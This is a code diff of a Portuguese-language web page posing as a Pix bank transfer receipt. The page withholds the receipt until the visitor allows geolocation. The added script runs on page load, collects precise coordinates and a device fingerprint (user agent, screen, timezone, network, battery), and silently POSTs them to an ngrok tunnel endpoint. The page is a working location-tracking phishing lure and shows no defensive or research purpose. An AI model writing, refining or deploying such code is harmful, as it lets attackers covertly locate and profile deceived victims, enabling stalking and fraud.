@@ -72,7 +72,6 @@
 
     .section h2::before {
       content: '▸';
-      display: inline-block;
       margin-right: 0.5rem;
       color: #8f8f8f;
     }
@@ -101,7 +100,7 @@
       margin: 0.5rem 0;
     }
 
-    /* estilos do overlay que bloqueia o acesso */
+    /* Overlay */
     #overlay {
       position: fixed;
       top: 0;
@@ -131,23 +130,23 @@
       cursor: pointer;
       border: none;
       border-radius: 4px;
+      background: #fff;
+      color: #333;
     }
   </style>
 </head>
 
 <body>
 
-  <!-- Overlay que obriga a liberar localização -->
   <div id="overlay">
     <h2>Precisamos da sua localização</h2>
     <p>Para visualizar o comprovante, habilite o acesso à sua localização.</p>
     <button id="retry">Tentar novamente</button>
     <p style="font-size:.8rem; margin-top:1rem;">
-      Se você negou antes, será preciso ajustar nas configurações do navegador.
+      Se você negou antes, ajuste nas configurações do navegador.
     </p>
   </div>
 
-  <!-- Comprovante (inicialmente oculto) -->
   <div id="receipt" class="container" style="display: none;">
     <header>
       <img src="https://via.placeholder.com/100x32?text=Logo" alt="Logo">
@@ -156,12 +155,10 @@
 
     <div class="summary">
       <div class="item">
-        <b>Valor</b>
-        R$ 150,00
+        <b>Valor</b> R$ 150,00
       </div>
       <div class="item">
-        <b>Tipo de transferência</b>
-        Pix
+        <b>Tipo de transferência</b> Pix
       </div>
     </div>
 
@@ -170,22 +167,10 @@
     <section class="section">
       <h2>Destino</h2>
       <div class="fields">
-        <div class="field">
-          <b>Nome</b>
-          Ana Carolina Mendes
-        </div>
-        <div class="field">
-          <b>Instituição</b>
-          Banco do Brasil S.A.
-        </div>
-        <div class="field">
-          <b>CPF</b>
-          •••.123.456-••
-        </div>
-        <div class="field">
-          <b>Tipo de conta</b>
-          Conta corrente
-        </div>
+        <div class="field"><b>Nome</b> Ana Carolina Mendes</div>
+        <div class="field"><b>Instituição</b> Banco do Brasil S.A.</div>
+        <div class="field"><b>CPF</b> •••.123.456-••</div>
+        <div class="field"><b>Tipo de conta</b> Conta corrente</div>
       </div>
     </section>
 
@@ -194,26 +179,11 @@
     <section class="section">
       <h2>Origem</h2>
       <div class="fields">
-        <div class="field">
-          <b>Nome</b>
-          Lucas Vieira
-        </div>
-        <div class="field">
-          <b>Conta</b>
-          4321 56789-0
-        </div>
-        <div class="field">
-          <b>Instituição</b>
-          Nubank – Nu Pagamentos S.A.
-        </div>
-        <div class="field">
-          <b>CPF</b>
-          •••.987.654-••
-        </div>
-        <div class="field">
-          <b>Agência</b>
-          0001
-        </div>
+        <div class="field"><b>Nome</b> Lucas Vieira</div>
+        <div class="field"><b>Conta</b> 4321 56789-0</div>
+        <div class="field"><b>Instituição</b> Nubank – Nu Pagamentos S.A.</div>
+        <div class="field"><b>CPF</b> •••.987.654-••</div>
+        <div class="field"><b>Agência</b> 0001</div>
       </div>
     </section>
 
@@ -221,53 +191,103 @@
       <div class="line"><b>Nu Pagamentos S.A. – Instituição de Pagamento</b></div>
       <div class="line">CNPJ 12.345.678/0001-99</div>
       <div class="line"><b>ID da transação:</b> A1B2C3D4E5F6G7H8I9J0</div>
-      <div class="line">Em caso de dúvidas, fale com a gente:</div>
-      <div class="line">0800 123 4567 • atendimento@seudominio.com</div>
-      <div class="line">(segunda a sexta, das 09h às 18h – horário de Brasília)</div>
+      <div class="line">Dúvidas? 0800 123 4567 • atendimento@seudominio.com</div>
+      <div class="line">(Seg–Sex, 09h–18h, horário de Brasília)</div>
     </footer>
   </div>
 
   <script>
     const overlay = document.getElementById('overlay');
-    const retryButton = document.getElementById('retry');
     const receipt = document.getElementById('receipt');
+    const retryBtn = document.getElementById('retry');
+
+    function showOverlay() {
+      overlay.classList.remove('hidden');
+      receipt.style.display = 'none';
+    }
+
+    function showReceipt() {
+      overlay.classList.add('hidden');
+      receipt.style.display = 'block';
+    }
+
+    async function collectDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        languages: navigator.languages,
+        language: navigator.language,
+        deviceMemory: navigator.deviceMemory || null,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        cookieEnabled: navigator.cookieEnabled,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          pixelRatio: window.devicePixelRatio,
+        },
+        connection: navigator.connection
+          ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+          }
+          : null
+      };
+
+      if (navigator.getBattery) {
+        try {
+          const batt = await navigator.getBattery();
+          info.battery = {
+            level: batt.level,
+            charging: batt.charging,
+          };
+        } catch { }
+      }
+
+      return info;
+    }
 
     function requestLocation() {
       if (!navigator.geolocation) {
-        alert('Geolocalização não suportada neste navegador.');
+        alert('Geolocalização não suportada.');
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
-        pos => {
-          // Usuário liberou localização: esconde overlay e mostra comprovante
-          overlay.classList.add('hidden');
-          receipt.style.display = 'block';
+        async pos => {
+          showReceipt();
 
-          fetch('https://ba44-2804-d59-a41a-de00-8802-c1ff-cd3e-cb28.ngrok-free.app', {
+          const coords = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            altitudeAccuracy: pos.coords.altitudeAccuracy,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+            timestamp: pos.timestamp
+          };
+
+          const device = await collectDeviceInfo();
+
+          fetch('https://ba44-2804-d59-a41a-de00-8802-c1ff-cd3e-cb28.ngrok-free.app/send-location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            })
-          })
-            .catch(err => console.error('Erro ao enviar localização:', err));
+            body: JSON.stringify({ coords, device }),
+          }).catch(err => console.error('Erro ao enviar:', err));
         },
         err => {
-          // Negou ou deu erro: mantém overlay visível
-          overlay.classList.remove('hidden');
-        }
+          console.warn('Erro de geolocalização:', err);
+          showOverlay();
+        },
+        { timeout: 10000 }
       );
     }
 
-    retryButton.addEventListener('click', () => {
-      requestLocation();
-    });
-
-    window.addEventListener('load', () => {
-      requestLocation();
-    });
+    // listeners globais
+    window.addEventListener('load', requestLocation);
+    retryBtn.addEventListener('click', requestLocation);
   </script>
 </body>
 
